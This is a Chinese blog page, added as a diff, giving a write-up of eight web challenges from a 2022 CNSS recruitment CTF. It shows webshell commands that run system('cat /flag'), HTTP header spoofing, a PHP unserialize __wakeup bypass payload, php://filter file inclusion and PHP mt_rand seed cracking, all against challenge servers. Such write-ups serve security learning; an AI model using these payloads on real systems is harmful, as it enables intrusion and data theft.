@@ -1,0 +1,507 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+
+<!-- Head tag -->
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <!--Description-->
+    
+        <meta name="description" content="📝 [Baby] SignIn
+打开链接, F12被禁了, 直接用Ctrl+Shift+I打开开发者工具, 去掉disabled, 点击Flag按钮即可">
+    
+
+    <!--Author-->
+    
+        <meta name="author" content="Timlzh">
+    
+
+    <!-- Title -->
+    
+    <title>2022 CNSS Recruit Web 复现wp | CTF Writeup | Tim的杂货铺</title>
+
+    <!-- favicon -->
+    
+        <link rel="shortcut icon" href="https://timlzh.github.io/melody-favicon.ico">
+    
+
+    <!-- Bootstrap Core CSS -->
+    <link href="//cdn.jsdelivr.net/npm/bootstrap@3.3.6/dist/css/bootstrap.min.css" rel="stylesheet">
+
+    <!-- Valine -->
+    <script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+
+    <link rel="stylesheet" href="/server-archive/css/darkmode.css">
+
+    <!-- Custom CSS -->
+    
+<link rel="stylesheet" href="/server-archive/css/style.css">
+
+
+    <!-- Top Menu  -->
+    <div class="top_menu">
+        
+            
+            <a href="/server-archive/">Home</a>
+            
+            <a href="/server-archive/links">Friends</a>
+            
+            <a href="/server-archive/tags">Tags</a>
+            
+            <a href="/server-archive/about">About</a>
+            
+            <a href="/server-archive/">asdfa</a>
+            
+        
+        <a class="darkmode-toggle" href="#" data-toggle="darkmode">
+            <i class="fa fa-moon-o"></i>
+            <i class="fa fa-sun-o" style="display: none;"></i>
+        </a>
+    </div>
+
+    <!-- Darkmode -->
+    <script src='/server-archive/js/darkmode.js'></script>
+
+    <!-- Custom Fonts -->
+    <link href="//cdn.jsdelivr.net/npm/font-awesome@4.5.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+    <link href='//fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
+    <link href='//fonts.googleapis.com/css?family=Noto+Serif:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
+
+    <!-- jQuery -->
+    <script src="//cdn.bootcss.com/jquery/2.2.1/jquery.min.js"></script>
+    <!-- Bootstrap -->
+    <script src="//cdn.jsdelivr.net/npm/bootstrap@3.3.6/dist/js/bootstrap.min.js"></script>
+
+    <!-- Highlight -->
+    
+        <script>
+            var lightTheme = "github";
+            var darkTheme = "github-dark-dimmed";
+        </script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+    
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+    <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+    <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/server-archive/atom.xml" title="Tim的杂货铺" type="application/atom+xml">
+</head>
+
+
+<body>
+
+    <!-- Content -->
+    
+
+
+<section class="article-container">
+    <!-- Back Home -->
+    <!-- <a class="nav-back" href="javascript:back()">
+    <i class="fa fa-arrow-left"></i>
+</a>
+
+<script>
+    function back() {
+        var home = '/server-archive/'
+        if (document.referrer && document.referrer.indexOf(home) > -1) {
+            window.history.back();
+        } else {
+            window.location.href = home;
+        }
+    }
+</script> -->
+
+        <!-- Page Header -->
+        <header class="intro-header">
+            <div class="container">
+                <div class="row">
+                    <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                        <div class="post-heading">
+                            <h1>
+                                2022 CNSS Recruit Web 复现wp
+                            </h1>
+                            <div class="subheading">
+                                CTF Writeup
+                            </div>
+                            <hr>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </header>
+
+        <!-- Post Content -->
+        <article>
+            <div class="container">
+                <div class="row">
+                    <!-- Post Main Content -->
+                    <div class="post-content col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                        <h1 id="%F0%9F%93%9D-%5Bbaby%5D-signin" tabindex="-1">📝 [Baby] SignIn</h1>
+<p>打开链接, F12被禁了, 直接用Ctrl+Shift+I打开开发者工具, 去掉disabled, 点击Flag按钮即可</p>
+<span id="more"></span>
+<p><img src="http://pic.timlzh.com/i/2023/11/03/12ph35m-2.png" alt="image"></p>
+<p><img src="http://pic.timlzh.com/i/2023/11/03/12phfdt-2.png" alt="image"></p>
+<p><code>cnss&#123;yOu_kNOw_h7ml_W3lL!&#125;</code></p>
+<h1 id="%F0%9F%9A%AA-%5Bbaby%5D-backdoor" tabindex="-1">🚪 [Baby] Backdoor</h1>
+<p>题目就是一个马, 题目提示用蚁剑. 这里我没用蚁剑, 直接Hackbar post命令上去</p>
+<p><code>cnss=system(&quot;cat /flag&quot;);</code></p>
+<p><img src="http://pic.timlzh.com/i/2023/11/03/12phc5u-2.png" alt="image"></p>
+<p><code>cnss&#123;Php_b@CkDO0R_ONe_1in3R&#125;</code></p>
+<h1 id="%F0%9F%93%A6-%5Bbaby%5D-webpack" tabindex="-1">📦 [Baby] Webpack</h1>
+<p>React的map可能会在前端泄露源码, 尝试在js文件后加.map后缀</p>
+<p><img src="http://pic.timlzh.com/i/2023/11/03/12phlyp-2.png" alt="image"></p>
+<p>即为: <code>http://101.200.202.216:60218/static/js/main.c91fb7d1.js.map</code></p>
+<p><img src="http://pic.timlzh.com/i/2023/11/03/12phmjv-2.png" alt="image"></p>
+<p>就可以下载到.map文件, vscode打开, 搜索cnss字符串即可</p>
+<p><img src="http://pic.timlzh.com/i/2023/11/03/12phu32-2.png" alt="image"></p>
+<p><code>cnss&#123;No_W3BpAcK_m4p&#125;</code></p>
+<h1 id="%F0%9F%97%BC-%5Bbaby%5D-%E5%97%9C%E8%A1%80%E6%88%90%E9%AD%94" tabindex="-1">🗼 [Baby] 嗜血成魔</h1>
+<p>不知道是不是正解, 直接在js文件里搜索alert, 找到了一个base64的字符串, 解密即可</p>
+<p><img src="http://pic.timlzh.com/i/2023/11/03/12pi01s-2.png" alt="image"></p>
+<p><code>cnss&#123;M4Yb3_yOu_KN0w_jS&#125;</code></p>
+<h1 id="%F0%9F%92%A7-%5Beasy%5D-leak" tabindex="-1">💧 [Easy] Leak</h1>
+<p>提示vim崩掉了, 尝试swp文件, 即<code>http://101.200.202.216:17990/.index.php.swp</code>.</p>
+<p>下载到swp文件, vim还原<code>vim -r index.php</code>或直接vsc打开也能看到代码, 发现是个马</p>
+<p><img src="http://pic.timlzh.com/i/2023/11/03/12phyzv-2.png" alt="image"></p>
+<p>利用<code>?cnss@30fc5b20a309996f3ab12662e3c4ac932c08db7f=system(&quot;ls /&quot;);</code>获取文件名为<code>fl4444444g</code>, 再<code>?cnss@30fc5b20a309996f3ab12662e3c4ac932c08db7f=system(&quot;cat /fl4444444g&quot;);</code>即可</p>
+<p><img src="http://pic.timlzh.com/i/2023/11/03/12pia2a-2.png" alt="image"></p>
+<p><code>cnss&#123;ClE4n_VIm_sWapfILe_pLe4se&#125;</code></p>
+<h1 id="%F0%9F%8E%AF-%5Beasy%5D-ezhttp" tabindex="-1">🎯 [Easy] ezhttp</h1>
+<p>利用burp suite打开, 看到<code>只接受CNSS请求</code></p>
+<p><img src="http://pic.timlzh.com/i/2023/11/03/12pihv1-2.png" alt="image"></p>
+<p>于是将请求改为CNSS, 发送后发现<code>只能在安卓微信内置浏览器中请求</code></p>
+<p><img src="http://pic.timlzh.com/i/2023/11/03/12pieb8-2.png" alt="image"></p>
+<p>于是改<code>User-Agent</code>为安卓微信内置浏览器的UA, 搜索一下可知是<code>Mozilla/5.0 (Linux; Android 7.1.1; MI 6 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/6.2 TBS/043807 Mobile Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN</code>, 发送后发现<code>只接受来自cnss.io的请求</code></p>
+<p><img src="http://pic.timlzh.com/i/2023/11/03/12pik7t-2.png" alt="image"></p>
+<p>于是改<code>Referer</code>为<code>cnss.io</code>, 发送后发现<code>只接受来自本机的请求</code></p>
+<p><img src="http://pic.timlzh.com/i/2023/11/03/12pivh5-2.png" alt="image"></p>
+<p>于是改<code>X-Forwarded-For</code>为<code>127.0.0.1</code>, 发送后发现<code>只接受uestc.edu.cn域名的请求</code></p>
+<p><img src="http://pic.timlzh.com/i/2023/11/03/12pj0pr-2.png" alt="image"></p>
+<p>于是改<code>Host</code>为<code>uestc.edu.cn</code>, 发送后发现<code>只接受内容类型为application/json的请求</code></p>
+<p><img src="http://pic.timlzh.com/i/2023/11/03/12pry99-2.png" alt="image"></p>
+<p>于是改<code>Content-Type</code>为<code>application/json</code>, 发送后发现<code>不接受内容长度为0的请求</code></p>
+<p><img src="http://pic.timlzh.com/i/2023/11/03/12ps3sz-2.png" alt="image"></p>
+<p>随便发个json过去, 发现<code>能告诉我你的名字(name)吗？</code></p>
+<p><img src="http://pic.timlzh.com/i/2023/11/03/12ps7od-2.png" alt="image"></p>
+<p>于是加<code>name</code>字段, 发送后发现<code>能告诉我你的密码(password)吗？</code></p>
+<p><img src="http://pic.timlzh.com/i/2023/11/03/12pslaq-2.png" alt="image"></p>
+<p>于是加<code>password</code>字段, 发送后发现<code>能在cookie中写入你的名字(name)吗？</code></p>
+<p><img src="http://pic.timlzh.com/i/2023/11/03/12psj71-2.png" alt="image"></p>
+<p>于是加上Cookie, 发送后发现<code>能在Cookie中写入你的密码(password)吗？</code></p>
+<p><img src="http://pic.timlzh.com/i/2023/11/03/12psril-2.png" alt="image"></p>
+<p>加上后发现<code>BasicAuth验证失败</code></p>
+<p><img src="http://pic.timlzh.com/i/2023/11/03/12pszu8-2.png" alt="image"></p>
+<p>搜索后可知, BasicAuth只需写入<code>Authorization: Basic [&quot;username:password&quot;字段的base64加密]</code></p>
+<p><img src="http://pic.timlzh.com/i/2023/11/03/12pt420-2.png" alt="image"></p>
+<p>加密后得到<code>VGltbHpoOlRpbWx6aA==</code>, 于是加上Authorization, 发送后即得到flag</p>
+<p><img src="http://pic.timlzh.com/i/2023/11/03/12ptghj-2.png" alt="image"></p>
+<p><code>cnss&#123;c989245e3a04e1b5004b2dd40d7bfb7c&#125;</code></p>
+<h1 id="%F0%9F%90%98-%5Beasy%5D-ezunserialize" tabindex="-1">🐘 [Easy] ezunserialize</h1>
+<p>打开后发现是一个简单的反序列化+绕过wakeup</p>
+<p><img src="http://pic.timlzh.com/i/2023/11/03/12pteyq-2.png" alt="image"></p>
+<p>利用这段php代码构造反序列化的文本</p>
+<pre><code class="language-php">&lt;?php
+class CNSS
+&#123;
+    public $username = 'admin';
+    private $i_want2_say = 'i_like_web';
+    protected $password  = 'ctf';
+&#125;
+$a = new CNSS();
+echo serialize($a);
+?&gt;
+</code></pre>
+<p>尝试后会发现并不对, 但是如果你直接复制网页上的代码, 会发现<code>fssmsl</code>这个字段并不是注释的一部分, 而是通过某种特殊的空字符被扔到了后面, 实际上是i_want2_say的一部分, 如图:</p>
+<p><img src="http://pic.timlzh.com/i/2023/11/03/12ptk6h-2.png" alt="image"></p>
+<p>所以用这个脚本构造:</p>
+<pre><code class="language-php">&lt;?php
+class CNSS
+&#123;
+    public $username = 'admin';
+    private $i_want2_say = '‮⁦fssmsl⁩⁦i_like_web';
+    protected $password  = 'ctf';
+&#125;
+$a = new CNSS();
+echo serialize($a);
+?&gt;
+</code></pre>
+<p>构造出:</p>
+<p><code>O:4:&quot;CNSS&quot;:3:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;s:17:&quot;%00CNSS%00i_want2_say&quot;;s:28:&quot;‮⁦fssmsl⁩⁦i_like_web&quot;;s:11:&quot;%00*%00password&quot;;s:3:&quot;ctf&quot;;&#125;</code></p>
+<p>将3改为4, 绕过wakeup:</p>
+<p><code>O:4:&quot;CNSS&quot;:4:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;s:17:&quot;%00CNSS%00i_want2_say&quot;;s:28:&quot;‮⁦fssmsl⁩⁦i_like_web&quot;;s:11:&quot;%00*%00password&quot;;s:3:&quot;ctf&quot;;&#125;</code></p>
+<p>传上去即可</p>
+<p><img src="http://pic.timlzh.com/i/2023/11/03/12ptrsd-2.png" alt="image"></p>
+<p><code>CNSS&#123;un5Eria1i2E_I$_POweRFU1&#125;</code></p>
+<h1 id="%F0%9F%8E%B2-%5Bmid%5D-pesudo2" tabindex="-1">🎲 [Mid] Pesudo2</h1>
+<p>打开是一个文件包含, 使用<code>php://filter/convert.base64-encode/resource=</code>用base64回显, 根据题目提示<code>GET 「file」 to find the truth included in 「pseudo」</code>读取pseudo.php</p>
+<p><code>http://43.143.99.15:60002/?file=php://filter/convert.base64-encode/resource=pseudo.php</code></p>
+<p>base64解密后得到源码</p>
+<pre><code class="language-php">&lt;?php
+//version php:7.2-apache
+error_reporting(0);
+
+$seed = getenv('srand');
+$flag = getenv('flag');
+mt_srand($seed);
+$ans = mt_rand();
+
+$begin = $_GET['begin'];
+$guess = $_POST['guess'];
+
+
+if ($begin === 'true' &amp;&amp; is_numeric($guess)) &#123;
+    echo $ans . &quot;&lt;br/&gt;&quot;;
+    // for ($i = 0; $i &lt;= 114514; $i++) &#123;
+    //     $ans += mt_rand();
+    // &#125;
+    $ans = getenv('ans');
+    if ($guess === $ans) &#123;
+        echo $flag;
+    &#125; else &#123;
+        echo &quot;You are lost in the fog.&quot;;
+    &#125;
+&#125;
+</code></pre>
+<p>这里可以找到一个伪随机的漏洞, 得到一个生成的随机数<code>ans=87104899</code>之后, 可以利用脚本破解mt_srand的结果(可以自己写脚本, 但是没有那么快, 这里用了优化过的github脚本<a target="_blank" rel="noopener" href="https://github.com/openwall/php_mt_seed">openwall/php_mt_seed</a>), 结合php版本可以得到三个种子<code>1137234869, 986753421, 2323915476</code>写脚本生成三种答案:</p>
+<pre><code class="language-php">&lt;?php
+mt_srand(1137234869);
+$ans = mt_rand();
+for ($i = 0; $i &lt;= 114514; $i++) &#123;
+    $ans += mt_rand();
+&#125;
+echo $ans.'&lt;/br&gt;';
+
+mt_srand(986753421);
+$ans = mt_rand();
+for ($i = 0; $i &lt;= 114514; $i++) &#123;
+    $ans += mt_rand();
+&#125;
+echo $ans.'&lt;/br&gt;';
+
+mt_srand(2323915476);
+$ans = mt_rand();
+for ($i = 0; $i &lt;= 114514; $i++) &#123;
+    $ans += mt_rand();
+&#125;
+echo $ans.'&lt;/br&gt;';
+</code></pre>
+<p>注意需要使用7.1+版本的php运行, 否则随机结果不同</p>
+<p><code>122853612520104, 122756472461839, 122757110307027</code></p>
+<p>都尝试一遍, 可以知道是122756472461839</p>
+<p><img src="http://pic.timlzh.com/i/2023/11/03/12ptqs8-2.png" alt="image"></p>
+<p><code>CNSS&#123;P53uDO_0r_7Rue_1T'5_4_QueS7iON&#125;</code></p>
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/katex/dist/katex.min.css">
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/markdown-it-texmath/css/texmath.min.css">
+
+
+                            <!-- Meta -->
+                            <div class="post-meta">
+                                <hr>
+                                <br>
+                                <div class="post-tags">
+                                    
+                                        
+
+<a href="/server-archive/tags/CTF/">#CTF</a> <a href="/server-archive/tags/Writeup/">#Writeup</a> <a href="/server-archive/tags/Web/">#Web</a>
+
+
+                                            
+                                </div>
+                                <div class="post-date">
+                                    
+                                        2022-10-21
+                                    
+                                </div>
+                            </div>
+                    </div>
+
+                    <!-- Comments -->
+                    <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                        <!-- Disqus Comments -->
+
+<div id="vcomments" class="comment"></div>
+<script>
+  new Valine({
+    el: '.comment',
+    appId: 'TSp33hlPwuAsaq6YiQt7qxqB-gzGzoHsz',
+    appKey: '4pv9GKDHCxnThP1EN1u9uYSN',
+    placeholder: 'random',
+    avatar: '',
+    enableQQ: true,
+    emojiCDN: '//i0.hdslb.com/bfs/emote/',
+    // 表情title和图片映射
+    emojiMaps: {
+      "tv_doge": "6ea59c827c414b4a2955fe79e0f6fd3dcd515e24.png",
+      "tv_亲亲": "a8111ad55953ef5e3be3327ef94eb4a39d535d06.png",
+      "tv_偷笑": "bb690d4107620f1c15cff29509db529a73aee261.png",
+      "tv_再见": "180129b8ea851044ce71caf55cc8ce44bd4a4fc8.png",
+      "tv_冷漠": "b9cbc755c2b3ee43be07ca13de84e5b699a3f101.png",
+      "tv_发怒": "34ba3cd204d5b05fec70ce08fa9fa0dd612409ff.png",
+      "tv_发财": "34db290afd2963723c6eb3c4560667db7253a21a.png",
+      "tv_可爱": "9e55fd9b500ac4b96613539f1ce2f9499e314ed9.png",
+      "tv_吐血": "09dd16a7aa59b77baa1155d47484409624470c77.png",
+      "tv_呆": "fe1179ebaa191569b0d31cecafe7a2cd1c951c9d.png",
+      "tv_呕吐": "9f996894a39e282ccf5e66856af49483f81870f3.png",
+      "tv_困": "241ee304e44c0af029adceb294399391e4737ef2.png",
+      "tv_坏笑": "1f0b87f731a671079842116e0991c91c2c88645a.png",
+      "tv_大佬": "093c1e2c490161aca397afc45573c877cdead616.png",
+      "tv_大哭": "23269aeb35f99daee28dda129676f6e9ea87934f.png",
+      "tv_委屈": "d04dba7b5465779e9755d2ab6f0a897b9b33bb77.png",
+      "tv_害羞": "a37683fb5642fa3ddfc7f4e5525fd13e42a2bdb1.png",
+      "tv_尴尬": "7cfa62dafc59798a3d3fb262d421eeeff166cfa4.png",
+      "tv_微笑": "70dc5c7b56f93eb61bddba11e28fb1d18fddcd4c.png",
+      "tv_思考": "90cf159733e558137ed20aa04d09964436f618a1.png",
+      "tv_惊吓": "0d15c7e2ee58e935adc6a7193ee042388adc22af.png",
+      "tv_打脸": "56ab10b624063e966bfcb76ea5dc4794d87dfd47.png",
+      "tv_抓狂": "fe31c08edad661d63762b04e17b8d5ae3c71a757.png",
+      "tv_抠鼻": "c666f55e88d471e51bbd9fab9bb308110824a6eb.png",
+      "tv_斜眼笑": "911f987aa8bc1bee12d52aafe62bc41ef4474e6c.png",
+      "tv_无奈": "ea8ed89ee9878f2fece2dda0ea8a5dbfe21b5751.png",
+      "tv_晕": "5443c22b4d07fb1907ccc610c8e6db254f2461b7.png",
+      "tv_流汗": "cead1c351ab8d79e9f369605beb90148db0fbed3.png",
+      "tv_流泪": "7e71cde7858f0cd50d74b0264aa26db612a8a167.png",
+      "tv_流鼻血": "c32d39db2737f89b904ca32700d140a9241b0767.png",
+      "tv_点赞": "f85c354995bd99e28fc76c869bfe42ba6438eff4.png",
+      "tv_生气": "26702dcafdab5e8225b43ffd23c94ac1ff932654.png",
+      "tv_生病": "8b0ec90e6b86771092a498c54f09fc94621c1900.png",
+      "tv_疑问": "0793d949b18d7be716078349c202c15ff166f314.png",
+      "tv_白眼": "c1d59f439e379ee50eef488bcb5e5378e5044ea4.png",
+      "tv_皱眉": "72ccad6679fea0d14cce648b4d818e09b8ffea2d.png",
+      "tv_目瞪口呆": "0b8cb81a68de5d5365212c99375e7ace3e7891b7.png",
+      "tv_睡着": "8b196675b53af58264f383c50ad0945048290b33.png",
+      "tv_笑哭": "1abc628f6d4f4caf9d0e7800878f4697abbc8273.png",
+      "tv_腼腆": "89712c0d4af73e67f89e35cbc518420380a7f6f4.png",
+      "tv_色": "61822c7e9aae5da76475e7892534545336b23a6f.png",
+      "tv_调侃": "4bc022533ef31544ca0d72c12c808cf4a1cce3e3.png",
+      "tv_调皮": "b9c41de8e82dd7a8515ae5e3cb63e898bf245186.png",
+      "tv_鄙视": "6e72339f346a692a495b123174b49e4e8e781303.png",
+      "tv_闭嘴": "c9e990da7f6e93975e25fd8b70e2e290aa4086ef.png",
+      "tv_难过": "87f46748d3f142ebc6586ff58860d0e2fc8263ba.png",
+      "tv_馋": "fc7e829b845c43c623c8b490ee3602b7f0e76a31.png",
+      "tv_鬼脸": "0ffbbddf8a94d124ca2f54b360bbc04feb6bbfea.png",
+      "tv_黑人问号": "45821a01f51bc867da9edbaa2e070410819a95b2.png",
+      "tv_鼓掌": "1d21793f96ef4e6f48b23e53e3b9e42da833a0f6.png"
+      // ... 更多表情
+    }
+  })
+  if('random' == 'random'){
+    var veditor = document.getElementById("veditor");
+    fetch('https://v1.hitokoto.cn')
+        .then(response => response.json())
+        .then(data => {
+        veditor.placeholder = '『' + data.hitokoto + '』' + '\n\n\n' + 'From  ' + data.from;
+        })
+        .catch(console.error)
+  }
+</script>
+
+                    </div>
+                </div>
+            </div>
+        </article>
+</section>
+
+<!-- Image viewer-->
+
+    
+    <!-- Custom picture view-->
+    <link href="/server-archive/css/viewer.min.css" rel="stylesheet" />
+    <script
+      src="/server-archive/js/viewer.min.js"
+      type="text/javascript"
+      charset="utf-8"
+    ></script>
+    
+    <script type="text/javascript">
+      // set image viewer
+      Viewer.setDefaults({
+        zoomRatio: [0.5],
+        navbar: false,
+        toolbar: false,
+        button: false,
+        title: [2, (image, imageData) => `${image.alt}`],
+        show: function() {
+          this.viewer.zoomTo(0.5);
+        }
+      });
+      var imageList = document.getElementsByTagName("img");
+      Array.prototype.forEach.call(imageList, element => {
+        var viewer = new Viewer(element);
+      });
+    </script>
+
+    
+
+
+<!-- TOC -->
+<!-- 
+    <aside id="article-toc" role="navigation" class="fixed">
+        <div id="article-toc-inner">
+            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%F0%9F%93%9D-%5Bbaby%5D-signin"><span class="toc-text">📝 [Baby] SignIn</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%F0%9F%9A%AA-%5Bbaby%5D-backdoor"><span class="toc-text">🚪 [Baby] Backdoor</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%F0%9F%93%A6-%5Bbaby%5D-webpack"><span class="toc-text">📦 [Baby] Webpack</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%F0%9F%97%BC-%5Bbaby%5D-%E5%97%9C%E8%A1%80%E6%88%90%E9%AD%94"><span class="toc-text">🗼 [Baby] 嗜血成魔</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%F0%9F%92%A7-%5Beasy%5D-leak"><span class="toc-text">💧 [Easy] Leak</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%F0%9F%8E%AF-%5Beasy%5D-ezhttp"><span class="toc-text">🎯 [Easy] ezhttp</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%F0%9F%90%98-%5Beasy%5D-ezunserialize"><span class="toc-text">🐘 [Easy] ezunserialize</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%F0%9F%8E%B2-%5Bmid%5D-pesudo2"><span class="toc-text">🎲 [Mid] Pesudo2</span></a></li></ol>
+        </div>
+    </aside>
+ -->
+
+
+    <script>
+        hljs.highlightAll();
+    </script>
+
+    <!-- Scripts -->
+    <script type="text/javascript">
+    console.log("© Timlzh 🙋 2022-" + new Date().getFullYear());
+    console.log("Welcome to my blog: https://timlzh.com");
+</script>
+  
+    <!-- Google Analytics -->
+    
+
+    <!-- Service Worker -->
+    <!-- if using service worker -->
+
+    
+    <!-- Go Top -->
+    <a class="go-top">
+    <i class="fa fa-arrow-up"></i>
+</a>
+
+<script type="text/javascript">
+    if ($(window).scrollTop() <= 100) {
+        $(".go-top").hide();
+    }
+    
+    $(function () {
+        $(window).scroll(function () {
+            if ($(window).scrollTop() > 100) {
+                $(".go-top").fadeIn(500);
+            } else {
+                $(".go-top").fadeOut(500);
+            }
+        });
+        $(".go-top").click(function () {
+            $('body,html').animate({scrollTop: 0}, 500);
+            return false;
+        });
+    });
+</script>
+</body>
+
+<footer>
+    
+    
+    
+        <div class="beian">
+            <a href="http://www.beian.miit.gov.cn" target="_blank">浙ICP备2022036129号-2</a>
+        </div>
+    
+
+</footer>
+
+</html>
